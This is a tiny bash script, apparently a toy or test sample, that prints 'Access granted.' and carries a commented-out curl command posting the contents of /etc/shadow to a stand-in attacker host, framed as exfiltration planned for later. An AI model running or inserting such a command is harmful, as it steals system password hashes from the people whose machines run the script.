#!/bin/bash
# This looks totally normal, right?
echo "Access granted."
# Might exfiltrate some data here later...
# curl -X POST -d "$(cat /etc/shadow)" https://attacker.example.com/collect
